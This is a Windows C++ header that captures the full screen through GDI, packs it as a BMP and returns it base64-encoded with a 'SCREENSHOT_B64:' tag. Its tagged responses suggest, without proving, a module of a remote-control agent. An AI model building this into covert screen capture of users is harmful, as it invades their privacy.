#pragma once

#ifdef _WIN32
#include <windows.h>
#include <vector>
#include <string>
#include "crypto.h"

namespace screenshot {

inline std::string capture() {
    HDC hScreenDC = GetDC(nullptr);
    if (!hScreenDC) return "SCREENSHOT_ERROR: GetDC failed";

    int screen_w = GetDeviceCaps(hScreenDC, HORZRES);
    int screen_h = GetDeviceCaps(hScreenDC, VERTRES);

    int width = screen_w;
    int height = screen_h;

    HDC hMemDC = CreateCompatibleDC(hScreenDC);
    if (!hMemDC) {
        ReleaseDC(nullptr, hScreenDC);
        return "SCREENSHOT_ERROR: CreateCompatibleDC failed";
    }

    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
    if (!hBitmap) {
        DeleteDC(hMemDC);
        ReleaseDC(nullptr, hScreenDC);
        return "SCREENSHOT_ERROR: CreateCompatibleBitmap failed";
    }

    HGDIOBJ hOld = SelectObject(hMemDC, hBitmap);
    BitBlt(hMemDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY);
    SelectObject(hMemDC, hOld);

    DeleteDC(hMemDC);
    ReleaseDC(nullptr, hScreenDC);

    BITMAPINFOHEADER bi = {0};
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = width;
    bi.biHeight = height;
    bi.biPlanes = 1;
    bi.biBitCount = 32;
    bi.biCompression = BI_RGB;
    bi.biSizeImage = width * height * 4;

    std::vector<BYTE> pixels(bi.biSizeImage);
    HDC hReadDC = CreateCompatibleDC(nullptr);
    if (hReadDC) {
        SelectObject(hReadDC, hBitmap);
        GetDIBits(hReadDC, hBitmap, 0, height, pixels.data(), (BITMAPINFO*)&bi, DIB_RGB_COLORS);
        DeleteDC(hReadDC);
    }
    DeleteObject(hBitmap);

    BITMAPFILEHEADER bf;
    bf.bfType = 0x4D42;
    bf.bfSize = sizeof(bf) + sizeof(bi) + bi.biSizeImage;
    bf.bfReserved1 = 0;
    bf.bfReserved2 = 0;
    bf.bfOffBits = sizeof(bf) + sizeof(bi);

    std::vector<BYTE> bmp;
    bmp.reserve(bf.bfSize);
    auto ptr = reinterpret_cast<const BYTE*>(&bf);
    bmp.insert(bmp.end(), ptr, ptr + sizeof(bf));
    ptr = reinterpret_cast<const BYTE*>(&bi);
    bmp.insert(bmp.end(), ptr, ptr + sizeof(bi));
    bmp.insert(bmp.end(), pixels.begin(), pixels.end());

    return "SCREENSHOT_B64:" + crypto::base64_encode(bmp);
}

} // namespace screenshot
#endif
